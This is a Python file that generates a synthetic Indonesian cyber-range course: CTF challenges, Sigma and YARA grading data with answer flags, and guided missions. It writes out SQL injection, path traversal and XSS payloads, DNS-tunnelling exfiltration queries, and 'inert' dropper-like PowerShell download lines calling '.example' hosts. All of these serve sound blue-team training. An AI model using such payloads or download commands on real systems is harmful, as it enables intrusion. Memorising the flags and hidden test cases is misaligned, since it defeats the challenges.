"""v1.3 training content in Indonesian: a learning path from beginner to advanced, tiered CTF challenges with generated
attachments, auto-graded rule-writing challenges (Sigma, YARA) and guided missions.

Every artefact is synthetic training material built here deterministically. IP addresses come from the documentation
ranges (RFC 5737), domains end in `.example`, and the "malware" samples are inert text that only *looks* like a script.
None of it is ingested into the SIEM or presented as real telemetry. Flags are derived from the artefacts, so a learner
can only obtain them by doing the analysis.
"""
import base64
import json

# ------------------------------------------------------------------ beginner: phishing e-mail headers
PHISH_EML = (
    "Return-Path: <billing@paypa1-secure.example>\r\n"
    "Received: from mx2.perusahaan.example (mx2.perusahaan.example [192.0.2.25])\r\n"
    "\tby mail.perusahaan.example with ESMTPS id 4F2A1; Tue, 17 Nov 2026 08:14:09 +0700\r\n"
    "Received: from relay.bulk-sender.example (relay.bulk-sender.example [203.0.113.18])\r\n"
    "\tby mx2.perusahaan.example with ESMTP id 9C71B; Tue, 17 Nov 2026 08:14:07 +0700\r\n"
    "Received: from laptop-x (unknown [198.51.100.66])\r\n"
    "\tby relay.bulk-sender.example with ESMTPA id 11D0E; Tue, 17 Nov 2026 01:14:02 +0000\r\n"
    "From: \"Layanan Pembayaran\" <billing@paypa1-secure.example>\r\n"
    "Reply-To: verifikasi@akun-aman.example\r\n"
    "To: staf.keuangan@perusahaan.example\r\n"
    "Subject: [PENTING] Akun Anda akan ditangguhkan dalam 24 jam\r\n"
    "Date: Tue, 17 Nov 2026 01:14:01 +0000\r\n"
    "Message-ID: <a81f-77@laptop-x>\r\n"
    "Authentication-Results: mail.perusahaan.example; spf=fail smtp.mailfrom=paypa1-secure.example; dkim=none; dmarc=fail\r\n"
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "Yth. Pelanggan,\r\n\r\nKami mendeteksi aktivitas tidak biasa. Segera verifikasi akun Anda melalui tautan berikut:\r\n"
    "http://paypa1-secure.example/verifikasi?id=88231\r\n\r\nJika tidak, akun akan ditangguhkan.\r\n\r\n"
    "-- MATERI LATIHAN CYBER RANGE: email ini sintetis dan tidak berbahaya --\r\n"
).encode()

# ------------------------------------------------------------------ beginner: Windows logon events
def logon_csv() -> bytes:
    rows = ["TimeCreated,EventID,TargetUserName,IpAddress,LogonType,Status"]
    t = 0
    for user in (["administrator", "admin", "backup", "svc_backup", "guest", "test", "svc_backup", "administrator"] * 2):
        t += 4
        rows.append(f"2026-11-17T02:{10 + t // 60:02d}:{t % 60:02d}Z,4625,{user},192.0.2.50,10,0xC000006A")
    rows.append("2026-11-17T02:11:40Z,4624,svc_backup,192.0.2.50,10,0x0")
    rows.append("2026-11-17T02:11:52Z,4672,svc_backup,192.0.2.50,10,0x0")
    rows.append("2026-11-17T07:58:03Z,4624,budi.santoso,10.10.0.31,2,0x0")
    rows.append("2026-11-17T08:02:44Z,4625,siti.rahma,10.10.0.32,2,0xC000006A")
    rows.append("2026-11-17T08:02:51Z,4624,siti.rahma,10.10.0.32,2,0x0")
    return ("\n".join(rows) + "\n").encode()

# ------------------------------------------------------------------ intermediate: web attack in an access log
def access_log() -> bytes:
    lines = []
    normal = ["/", "/produk", "/produk/42", "/keranjang", "/assets/app.css", "/assets/logo.png", "/kontak", "/cari?q=kursi+kantor"]
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    sec = 0
    def add(ip, path, status, size, agent=ua):
        nonlocal sec
        sec += 3
        lines.append(f'{ip} - - [17/Nov/2026:10:{sec // 60:02d}:{sec % 60:02d} +0700] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"')
    for i in range(12):
        add(f"10.10.0.{40 + i % 5}", normal[i % len(normal)], 200, 1800 + i * 37)
    for p in ("/produk?id=1'", "/produk?id=1%20OR%201=1", "/produk?id=1%20UNION%20SELECT%20null,null--"):
        add("198.51.100.23", p, 500, 312, "sqlmap/1.8")
    for p in ("/produk?id=2'--", "/produk?id=2%20UNION%20SELECT%201,2,3--"):
        add("192.0.2.140", p, 403, 154, "python-requests/2.32")
    add("10.10.0.44", "/produk/7", 200, 2011)
    for p in ("/produk?id=3%27%20AND%20SLEEP(5)--", "/produk?id=3%20UNION%20SELECT%20username,password_hash,3%20FROM%20users--"):
        add("203.0.113.45", p, 200 if "UNION" in p else 500, 48210 if "UNION" in p else 290, "Mozilla/5.0 (X11; Linux x86_64)")
    for i in range(6):
        add(f"10.10.0.{40 + i}", normal[(i + 3) % len(normal)], 200, 1900 + i * 11)
    return ("\n".join(lines) + "\n").encode()

# ------------------------------------------------------------------ intermediate: data exfiltration over DNS
DNS_SECRET = "CR{dns_b0c0r_p3lan}"


def dns_log() -> bytes:
    hexs = DNS_SECRET.encode().hex()
    chunks = [hexs[i:i + 10] for i in range(0, len(hexs), 10)]
    order = [3, 0, 2, 1] + list(range(4, len(chunks)))
    lines = ["# ts\tclient\tquery\tqtype\trcode"]
    t = 0
    benign = ["www.perusahaan.example", "update.os-vendor.example", "cdn.fonts.example", "mail.perusahaan.example", "time.ntp.example"]
    for n, idx in enumerate(order):
        for b in benign[n % 2: n % 2 + 2]:
            t += 2
            lines.append(f"1763370{t:03d}\t10.10.0.{30 + n % 4}\t{b}\tA\tNOERROR")
        t += 5
        lines.append(f"1763370{t:03d}\t10.10.0.22\t{idx:02d}-{chunks[idx]}.t.exfil-cdn.example\tTXT\tNXDOMAIN")
    return ("\n".join(lines) + "\n").encode()

# ------------------------------------------------------------------ advanced: incident timeline / patient zero
def timeline_files() -> list[tuple[str, bytes]]:
    proxy = "\n".join([
        "2026-11-16T08:55:12Z ws-03 GET http://intranet.perusahaan.example/ 200",
        "2026-11-16T09:02:41Z ws-07 GET http://invoice-portal.example/dl/invoice_7781.docm 200",
        "2026-11-16T09:05:10Z ws-03 GET http://invoice-portal.example/dl/invoice_7781.docm 200",
        "2026-11-16T09:03:30Z ws-07 POST http://cdn-update-check.example/api/v2/ping 200",
        "2026-11-16T09:31:02Z ws-11 POST http://cdn-update-check.example/api/v2/ping 200",
        "2026-11-16T09:44:19Z ws-12 POST http://cdn-update-check.example/api/v2/ping 200",
        "2026-11-16T10:01:55Z ws-01 GET http://news.example/ 200",
    ]) + "\n"
    edr = "\n".join([
        "time,host,parent,process,action,detail",
        "2026-11-16T09:02:58Z,ws-07,WINWORD.EXE,powershell.exe,allowed,-nop -w hidden -enc <...>",
        "2026-11-16T09:05:31Z,ws-03,WINWORD.EXE,powershell.exe,blocked,macro blocked by policy (ASR rule)",
        "2026-11-16T09:29:47Z,ws-11,services.exe,svc-upd.exe,allowed,service installed remotely",
        "2026-11-16T09:43:05Z,ws-12,services.exe,svc-upd.exe,allowed,service installed remotely",
    ]) + "\n"
    auth = "\n".join([
        "2026-11-16T09:28:40Z ws-11 4624 LogonType=3 user=it.helpdesk src=10.10.0.27",
        "2026-11-16T09:42:11Z ws-12 4624 LogonType=3 user=it.helpdesk src=10.10.0.27",
        "2026-11-16T09:12:03Z dc-1 4769 service=cifs/ws-11 user=it.helpdesk src=10.10.0.27",
        "# inventaris: ws-03=10.10.0.23 ws-07=10.10.0.27 ws-11=10.10.0.31 ws-12=10.10.0.32",
    ]) + "\n"
    return [("proxy.log", proxy.encode()), ("edr.csv", edr.encode()), ("auth.log", auth.encode())]

# ------------------------------------------------------------------ advanced: write a Sigma rule (auto-graded)
def _http(i, ip, uri, status=200, method="GET"):
    return {"id": i, "category": "http", "dataset": "nginx.access", "src_ip": ip, "dst_ip": "172.16.10.10", "dst_port": 80,
            "protocol": "http", "action": method, "outcome": str(status), "host": "web-1", "message": f"{method} {uri} {status}"}


SIGMA_EVENTS = [
    _http(1, "10.10.0.41", "/cari?q=select+kursi+kantor"),
    _http(2, "198.51.100.23", "/produk?id=1 UNION SELECT null,null--", 500),
    _http(3, "10.10.0.42", "/blog/tips-menulis-script-python"),
    _http(4, "203.0.113.45", "/download?file=../../../../etc/passwd", 403),
    _http(5, "10.10.0.43", "/assets/union-jack.png"),
    _http(6, "192.0.2.140", "/login?user=admin' or 1=1--", 401),
    _http(7, "10.10.0.44", "/api/pesanan?id=42"),
    _http(8, "198.51.100.77", "/komentar?isi=<script>alert(1)</script>", 400),
    _http(9, "10.10.0.45", "/docs/panduan-or-faq"),
    _http(10, "10.10.0.46", "/login", 302, "POST"),
    _http(11, "10.10.0.47", "/produk/12/ulasan"),
    _http(12, "10.10.0.48", "/cari?q=etc+passwd+artinya"),
]
SIGMA_MALICIOUS = [2, 4, 6, 8]
# not given to the learner: checks that the rule generalises instead of matching the four lines literally
SIGMA_HIDDEN = [
    {**_http(101, "198.51.100.99", "/item?id=7 UnIoN SeLeCt username,password FROM users--"), "_malicious": True},
    {**_http(102, "198.51.100.98", "/static/..%2f..%2f../etc/shadow".replace("%2f", "/"), 404), "_malicious": True},
    {**_http(103, "10.10.0.49", "/promo/select-union-store"), "_malicious": False},
    {**_http(104, "10.10.0.50", "/scripts/main.js"), "_malicious": False},
]


def sigma_events_jsonl() -> bytes:
    return ("\n".join(json.dumps(e, ensure_ascii=False) for e in SIGMA_EVENTS) + "\n").encode()


SIGMA_EXAMPLE = """title: Contoh - login gagal berulang
logsource:
  category: authentication
detection:
  selection:
    outcome: failure
  condition: selection
level: low
"""

# ------------------------------------------------------------------ advanced: write a YARA rule (auto-graded)
_INERT = "# MATERI LATIHAN CYBER RANGE - teks inert, bukan program yang berfungsi\n"
YARA_SAMPLES = {
    "dropper_a.txt": (_INERT + "$m = 'Global\\CRLab-7731'\n$k = 0x5A\n$u = 'https://cdn-update-check.example/a.bin'\n"
                      "Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\upd.bin\n# xor-decode with $k then load\n").encode(),
    "dropper_b.txt": (_INERT + "$mx = 'Global\\CRLab-7731'\n$key = 0x5A\n$src = 'https://img-cache.example/b.png'\n"
                      "(New-Object Net.WebClient).DownloadFile($src, \"$env:APPDATA\\cache.png\")\n# xor-decode with $key then load\n").encode(),
    "admin_backup.txt": (_INERT + "$src = 'https://backup.perusahaan.example/config.zip'\n"
                         "Invoke-WebRequest -Uri $src -OutFile D:\\backup\\config.zip\nWrite-Host 'Backup selesai'\n").encode(),
}
YARA_EXPECT = {"dropper_a.txt": True, "dropper_b.txt": True, "admin_backup.txt": False}
YARA_HIDDEN = {
    "dropper_c.txt": ((_INERT + "$name='Global\\CRLab-7731';$x=0x5A;Start-BitsTransfer -Source 'https://edge-sync.example/c.dat'\n").encode(), True),
    "it_update.txt": ((_INERT + "Start-BitsTransfer -Source 'https://update.perusahaan.example/patch.msu' -Destination C:\\patch\n").encode(), False),
}


def grader(slug: str) -> dict | None:
    """Server-side grading data. Never returned by the API (the learner only sees the attachments)."""
    if slug == "pemburu-sigma":
        hidden = [{k: v for k, v in e.items() if k != "_malicious"} for e in SIGMA_HIDDEN]
        return {"type": "sigma", "events": SIGMA_EVENTS + hidden,
                "malicious": SIGMA_MALICIOUS + [e["id"] for e in SIGMA_HIDDEN if e["_malicious"]]}
    if slug == "yara-pertama":
        samples = [{"name": n, "b64": base64.b64encode(d).decode(), "match": YARA_EXPECT[n], "hidden": False} for n, d in YARA_SAMPLES.items()]
        samples += [{"name": n, "b64": base64.b64encode(d).decode(), "match": m, "hidden": True} for n, (d, m) in YARA_HIDDEN.items()]
        return {"type": "yara", "samples": samples}
    return None


ATTACHMENTS = {
    "jejak-phishing": [("email-mencurigakan.eml", PHISH_EML)],
    "siapa-yang-masuk": [("security-events.csv", logon_csv())],
    "serangan-web": [("access.log", access_log())],
    "bocor-lewat-dns": [("dns-query.log", dns_log())],
    "patient-zero": timeline_files(),
    "pemburu-sigma": [("http-events.jsonl", sigma_events_jsonl()), ("contoh-rule.yml", SIGMA_EXAMPLE.encode())],
    "yara-pertama": [(n, d) for n, d in YARA_SAMPLES.items()],
}

FLAGS = {
    "jejak-phishing": "CR{198.51.100.66}",
    "siapa-yang-masuk": "CR{svc_backup}",
    "serangan-web": "CR{203.0.113.45}",
    "bocor-lewat-dns": DNS_SECRET,
    "patient-zero": "CR{ws-07}",
    "kantor-kecil-terbuka": "CR{6379}",
}

CHALLENGES = [
    {"slug": "jejak-phishing", "title": "Jejak email phishing", "category": "blue-team", "difficulty": "beginner", "points": 100,
     "description": "Staf keuangan menerima email yang meminta verifikasi akun. Tim SOC ingin tahu **dari mana email itu benar-benar dikirim**.\n\n"
                    "Buka `email-mencurigakan.eml` dengan editor teks. Header `Received:` ditambahkan oleh setiap server yang dilewati, "
                    "yang **paling bawah** adalah yang paling awal.\n\nFlag: `CR{<alamat IP pengirim asli>}`.",
     "hints": [("Baca header Received dari bawah ke atas. Yang paling bawah adalah lompatan pertama.", 10),
               ("Cari baris `from laptop-x (unknown [...])`: alamat di dalam kurung siku adalah IP pengirim.", 20)]},
    {"slug": "siapa-yang-masuk", "title": "Siapa yang berhasil masuk?", "category": "blue-team", "difficulty": "beginner", "points": 120,
     "description": "File `security-events.csv` berisi event login Windows dari server. Ada serangan tebak password (brute force) dari "
                    "satu alamat IP.\n\n* EventID **4625** = login gagal\n* EventID **4624** = login berhasil\n\n"
                    "Akun mana yang **berhasil** dimasuki oleh alamat penyerang? Flag: `CR{<nama akun>}`.",
     "hints": [("Buka di Excel/LibreOffice lalu filter kolom IpAddress = 192.0.2.50.", 10), ("Cari baris EventID 4624 dari alamat itu.", 25)]},
    {"slug": "kantor-kecil-terbuka", "title": "Layanan yang terbuka di kantor kecil", "category": "network", "difficulty": "beginner", "points": 120,
     "lab_template": "small-office",
     "description": "Deploy lab **Kantor Kecil** (tombol **Jalankan lab latihan** di kanan atas; berjalan terisolasi di lab Anda sendiri). Server file seharusnya hanya "
                    "berbagi file, tetapi ternyata ada layanan basis data yang ikut terbuka.\n\nJalankan scan dari Vulnerability Management "
                    "(scanner: `pc-admin`, target: `nas-1`) dan temukan port layanan basis data itu. Flag: `CR{<port>}`.",
     "hints": [("Vulnerability Management → Scan baru → pilih lab Kantor Kecil, scanner pc-admin, target nas-1.", 20)]},
    {"slug": "serangan-web", "title": "Serangan di log web", "category": "web", "difficulty": "intermediate", "points": 200,
     "description": "Toko online melaporkan beberapa error aneh. `access.log` menunjukkan beberapa alamat mencoba **SQL injection**. "
                    "Sebagian besar gagal (kode 403/500), tetapi satu alamat tampaknya berhasil mengambil data dalam jumlah besar.\n\n"
                    "Alamat IP mana yang **berhasil**? Flag: `CR{<ip>}`.",
     "hints": [("Cari kata `UNION` lalu perhatikan kode status HTTP (kolom setelah permintaan).", 20),
               ("Kode 200 dengan ukuran respons yang jauh lebih besar dari biasanya adalah tanda data berhasil diambil.", 40)]},
    {"slug": "bocor-lewat-dns", "title": "Bocor lewat DNS", "category": "network", "difficulty": "intermediate", "points": 250,
     "description": "Satu workstation mengirim banyak query DNS aneh ke domain yang tidak pernah ada. Penyerang menyelundupkan data dengan "
                    "menaruhnya di nama subdomain (**DNS tunneling**).\n\nDari `dns-query.log`, kumpulkan potongan data, **urutkan sesuai nomor "
                    "urutnya**, gabungkan, lalu decode. Hasilnya adalah flag berformat `CR{...}`.",
     "hints": [("Filter query yang berakhiran `.t.exfil-cdn.example`.", 20), ("Format subdomain: `<nomor>-<data hex>`. Urutkan nomornya.", 30),
               ("Gabungkan potongan hex lalu ubah ke teks, misalnya di CyberChef (From Hex) atau `xxd -r -p`.", 50)]},
    {"slug": "patient-zero", "title": "Mencari patient zero", "category": "forensics", "difficulty": "advanced", "points": 350,
     "description": "Beberapa workstation tiba-tiba berkomunikasi dengan server C2 `cdn-update-check.example`. Anda mendapat tiga log: proxy, EDR, "
                    "dan autentikasi.\n\nSusun **timeline** dan tentukan workstation mana yang **pertama kali** disusupi (patient zero), lalu "
                    "dari mana penyerang menyebar ke host lain. Hati-hati: tidak semua yang mengunduh file berbahaya ikut terinfeksi.\n\n"
                    "Flag: `CR{<nama host patient zero>}`.",
     "hints": [("Gabungkan ketiga log dan urutkan berdasarkan waktu.", 30), ("Lihat kolom `action` di edr.csv: diblokir berarti tidak terinfeksi.", 50),
               ("Login LogonType=3 ke ws-11 dan ws-12 berasal dari IP mana? Cocokkan dengan inventaris di auth.log.", 70)]},
    {"slug": "pemburu-sigma", "title": "Pemburu Sigma: tulis rule deteksi", "category": "blue-team", "difficulty": "advanced", "points": 400, "kind": "sigma",
     "description": "Tulis **rule Sigma** yang mendeteksi serangan web di `http-events.jsonl`: SQL injection, path traversal, dan XSS.\n\n"
                    "Penilaian otomatis:\n* rule harus mendeteksi **semua** event berbahaya,\n* **tidak boleh** ikut mendeteksi event normal "
                    "(false positive),\n* rule juga diuji pada beberapa event **tersembunyi**, jadi buat rule yang umum, jangan menyalin baris log.\n\n"
                    "Field yang tersedia: `category`, `src_ip`, `dst_port`, `action`, `outcome`, `message` (berisi metode + URI). "
                    "Lihat `contoh-rule.yml` untuk format dasarnya. Tempel rule Anda di kotak di bawah lalu klik **Nilai rule**.",
     "hints": [("Gunakan `message|contains` dengan beberapa nilai (daftar = OR).", 30),
               ("Kata `select` atau `script` saja terlalu umum. Pakai pola yang lebih spesifik, misalnya `union select`, `' or 1=1`, `../`, `<script`.", 60)]},
    {"slug": "yara-pertama", "title": "Rule YARA pertama Anda", "category": "malware", "difficulty": "advanced", "points": 350, "kind": "yara",
     "description": "Dua varian dropper (`dropper_a.txt`, `dropper_b.txt`) memakai URL berbeda, tetapi berbagi ciri khas yang sama. "
                    "`admin_backup.txt` adalah skrip admin yang sah.\n\nTulis **rule YARA** yang cocok dengan kedua dropper tetapi **tidak** dengan "
                    "skrip admin. Rule juga diuji pada varian tersembunyi dan skrip sah tersembunyi.\n\n"
                    "Semua sampel adalah teks inert khusus latihan, bukan malware.",
     "hints": [("Cari string yang sama persis di kedua dropper tetapi tidak ada di admin_backup.txt.", 30),
               ("Mutex `Global\\CRLab-7731` dan kunci `0x5A` muncul di kedua varian. Di YARA, backslash ditulis `\\\\`.", 60)]},
]


MISSIONS = [
    {"slug": "langkah-pertama", "title": "Langkah pertama", "difficulty": "beginner", "lab_template": "small-office",
     "briefing": "Selamat datang! Misi ini mengenalkan dasar-dasar keamanan siber dan cara memakai platform.\n\n"
                 "## Panduan langkah demi langkah\n1. Buka **Pelatihan → Keamanan siber dari nol** dan selesaikan pelajaran *Ancaman sehari-hari*.\n"
                 "2. Buka **Panduan memakai CYBER RANGE** dan selesaikan pelajaran *Lab pertama Anda*.\n"
                 "3. Kerjakan challenge **Jejak email phishing** di halaman CTF.\n"
                 "4. Klik **Jalankan lab misi** di misi ini, buka lab Kantor Kecil, lihat node dan layanannya, lalu jawab pertanyaan terakhir.\n"
                 "5. Klik **Verifikasi tujuan**: platform memeriksa semuanya secara otomatis.",
     "objectives": [
         {"title": "Pecahkan challenge 'Jejak email phishing'", "kind": "challenge", "config": {"slug": "jejak-phishing"}, "points": 20},
         {"title": "Di lab Kantor Kecil, apa hostname server yang membuka layanan basis data?", "kind": "answer", "answer": "nas-1", "points": 15,
          "hint": "Buka lab Anda, lihat daftar node dan layanannya (kolom port)."},
     ]},
    {"slug": "data-tanpa-kunci", "title": "Data tanpa kunci", "difficulty": "intermediate", "lab_template": "web-3tier",
     "briefing": "Tim pengembang memasang cache Redis untuk aplikasi web, tetapi lupa memberi password. Buktikan celahnya **di lab Anda sendiri** "
                 "dengan cara yang tidak merusak, lalu ketahui perbaikannya.\n\n## Panduan langkah demi langkah\n1. Klik **Jalankan lab misi** (template Aplikasi Web 3 Lapis).\n"
                 "2. Setelah lab `running`, buka **Vulnerability Management → Scan baru**: scanner `app-1`, target `cache-1`, profil quick.\n"
                 "3. Pastikan temuan *Redis accepts commands without authentication* (CR-VA-004) muncul.\n"
                 "4. Kerjakan challenge **Serangan di log web**.\n5. Jawab pertanyaan perbaikan, lalu klik **Verifikasi tujuan**.",
     "objectives": [
         {"title": "Scan lab Anda sampai menemukan 'Redis accepts commands without authentication' (CR-VA-004)", "kind": "vuln_finding",
          "config": {"code": "CR-VA-004"}, "points": 30, "hint": "Scanner app-1, target cache-1."},
         {"title": "Pecahkan challenge 'Serangan di log web'", "kind": "challenge", "config": {"slug": "serangan-web"}, "points": 25},
         {"title": "Opsi konfigurasi Redis apa yang mewajibkan password? (nama opsi saja)", "kind": "answer", "answer": "requirepass", "points": 15},
     ]},
    {"slug": "shift-analis-soc", "title": "Satu shift sebagai analis SOC", "difficulty": "intermediate", "lab_template": None,
     "briefing": "Misi untuk peran **Blue Team Analyst** atau **Incident Responder**. Anda menjalani satu shift: memilah alert sampai tuntas dan menangani insiden.\n\n"
                 "## Panduan langkah demi langkah\n1. Selesaikan pelajaran *Mengenal log dan alert*.\n2. Buka **Incident Response**, pilih satu alert, klik "
                 "**Tugaskan ke saya**, periksa event-nya, lalu tutup sebagai `resolved` atau `false positive` dengan catatan.\n"
                 "3. Buat insiden (atau eskalasi alert ke insiden) dan bawa sampai status `closed`.\n4. Klik **Verifikasi tujuan**.\n\n"
                 "Jika belum ada alert, minta instruktur menjalankan data DEMO atau jalankan skenario aman di lab.",
     "objectives": [
         {"title": "Tuntaskan satu alert yang ditugaskan ke Anda, dengan catatan penyelesaian", "kind": "alert_closed", "config": {}, "points": 30},
         {"title": "Tutup satu insiden yang Anda tangani", "kind": "incident_closed", "config": {}, "points": 40},
     ]},
    {"slug": "berburu-ancaman", "title": "Berburu ancaman", "difficulty": "advanced", "lab_template": "soc-enterprise",
     "briefing": "Misi tingkat mahir. Anda memasang sensor jaringan di lab perusahaan, menulis rule deteksi sendiri, dan merekonstruksi sebuah insiden.\n\n"
                 "## Panduan langkah demi langkah\n1. Klik **Jalankan lab misi** (template SOC Enterprise).\n2. Di halaman lab, tab **Sensor**, pasang Zeek atau "
                 "Suricata dan tunggu status `running`.\n3. Kerjakan **Pemburu Sigma** (rule dinilai otomatis).\n4. Kerjakan **Rule YARA pertama Anda**.\n"
                 "5. Kerjakan **Mencari patient zero**.\n6. Klik **Verifikasi tujuan**.",
     "objectives": [
         {"title": "Jalankan sensor Zeek atau Suricata di lab Anda", "kind": "sensor", "config": {"sensor": "any"}, "points": 30},
         {"title": "Pecahkan 'Pemburu Sigma: tulis rule deteksi'", "kind": "challenge", "config": {"slug": "pemburu-sigma"}, "points": 40},
         {"title": "Pecahkan 'Rule YARA pertama Anda'", "kind": "challenge", "config": {"slug": "yara-pertama"}, "points": 40},
         {"title": "Pecahkan 'Mencari patient zero'", "kind": "challenge", "config": {"slug": "patient-zero"}, "points": 40},
     ]},
]
